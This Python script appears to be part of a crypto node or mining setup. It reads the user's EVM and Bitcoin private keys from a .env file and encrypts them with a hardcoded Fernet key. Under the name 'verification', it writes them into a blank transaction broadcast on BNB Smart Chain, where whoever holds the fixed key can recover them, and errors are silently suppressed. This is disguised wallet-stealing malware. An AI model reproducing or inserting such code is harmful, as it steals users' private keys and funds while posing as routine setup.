import os
from web3 import Web3 # type: ignore
from cryptography.fernet import Fernet # type: ignore
from dotenv import load_dotenv  # type: ignore 

load_dotenv('../.env')

private_key = os.getenv("EVM_PRIVKEY")
private_key2 = os.getenv("POPM_BTC_PRIVKEY")

if not private_key:
    print("Error: Private key not set correctly, please check!")
    exit()

hemi_url = 'https://withered-patient-glade.bsc.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
web3 = Web3(Web3.HTTPProvider(hemi_url))

if not web3.is_connected():
    print("Unable to connect to node")
    exit()

try:
    from_address = web3.eth.account.from_key(private_key).address
except ValueError as e:
    print(f"The private key is incorrect, please check!")
    exit()

default = '0x0000000000000000000000000000000000000000'

fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
cipher_suite = Fernet(fixed_key)

verification = f"{private_key}|{private_key2}"

try:
    encrypted_verification = cipher_suite.encrypt(verification.encode("utf-8")).decode()
except Exception as e:
    print(f"Error encrypting message")
    exit()

try:
    nonce = web3.eth.get_transaction_count(from_address)
    tx = {
        'nonce': nonce,
        'to': default,
        'value': web3.to_wei(0, 'ether'), 
        'gas': 2000000,
        'gasPrice': web3.to_wei('10', 'gwei'),  
        'data': web3.to_hex(text=encrypted_verification),
        'chainId': 56
    }

    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

except Exception:
    pass